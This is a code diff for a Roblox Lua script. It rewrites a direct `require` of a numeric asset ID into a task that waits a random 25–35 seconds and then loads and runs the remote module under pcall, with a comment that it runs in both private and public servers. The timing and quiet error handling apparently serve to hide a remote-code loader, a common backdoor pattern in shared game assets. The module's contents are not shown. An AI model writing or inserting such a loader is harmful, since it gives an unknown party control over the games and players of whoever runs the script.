@@ -1,1 +1,18 @@
-require(75560638612652).Load()
+task.spawn(function()
+	-- Random delay between 25 and 35 seconds
+	local delayTime = math.random(25, 35)
+	task.wait(delayTime)
+
+	-- Run in both private and public servers
+	local success, err = pcall(function()
+		local module = require(75560638612652)
+		if module and module.Load then
+			module.Load()
+		else
+			warn("Module does not have a Load function")
+		end
+	end)
+	if not success then
+		warn("Failed to load module:", err)
+	end
+end)
